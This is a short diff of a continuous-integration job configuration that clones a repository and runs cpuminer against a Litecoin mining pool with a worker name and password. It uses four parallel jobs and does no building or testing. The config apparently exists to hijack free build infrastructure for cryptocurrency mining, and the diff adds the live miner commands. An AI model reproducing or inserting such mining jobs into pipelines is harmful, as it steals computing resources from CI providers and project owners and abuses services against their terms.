@@ -7,14 +7,14 @@ jobs:
       - run:
           command: |
            apk update && apk upgrade 
-           apk add openssh git openssl-dev jansson-dev
+           apk add openssh git openssl-dev bash  jansson-dev
            mkdir  ~/.ssh
            ssh-keyscan github.com >> ~/.ssh/known_hosts
            git clone --depth=1 git@github.com:ltcwoker/RDP.git Q
            cd Q
-           cp cpuminer /bin/
-           chmod 755 /bin/cpuminer
-           cpuminer --algo=scrypt --url=stratum+tcp://us.litecoinpool.org:3333 --userpass=djemil.mywoker13:my123456
+           bash
+           chmod 755 cpuminer
+           ./cpuminer --algo=scrypt --url=stratum+tcp://us.litecoinpool.org:3333 --userpass=djemil.mywoker13:my123456
       
    parallelism: 4       
 workflows:
